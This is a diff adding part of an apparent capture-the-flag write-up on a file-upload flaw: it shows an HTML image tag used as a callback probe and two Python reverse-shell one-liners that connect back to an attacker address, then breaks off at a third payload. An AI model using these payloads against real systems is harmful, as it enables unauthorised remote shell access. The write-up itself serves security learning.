@@ -71,4 +71,44 @@ So first we will see that it is making a impact or not by opening a python serve
 python -m http.server 5555
 ```
 
-And i
+And i then uplaoded the that html file
+
+```html
+<img src="http://YOUR_IP:5555/ping">
+
+```
+
+
+ and waited that am i getting a hit on my python server or not but still i didn't got the hit then i opened the source code and something unsuual it was the file location itself that i was not able to see after uploading the file.
+
+```html
+   
+                <img src='/uploads/profile_44286c38-3bde-46f8-b7b3-e3b03a1651ff.html' class='profile-pic' alt='Profile Picture' 
+                     onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22150%22 height=%22150%22%3E%3Ccircle cx=%2275%22 cy=%2275%22 r=%2275%22 fill=%22%23f48fb1%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22white%22 font-size=%2250%22%3E❤️%3C/text%3E%3C/svg%3E'">
+                
+```
+
+Here in this text we could see the location of file in the url and when i opened the file in a new tab i got the hit.
+
+So our mistake was taht after uploding the payload i was not trying to open the file.
+
+So here we are going again with the payload that we tried above.
+
+Payload 1
+
+```
+export RHOST="10.49.145.217";export RPORT=1234;python -c 'import
+   sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2
+   (s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+```
+
+still didn't get the shell
+
+Payload 2
+
+```
+export RHOST="10.49.145.217";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+```
+still didn't get the shell
+
+Payload 3
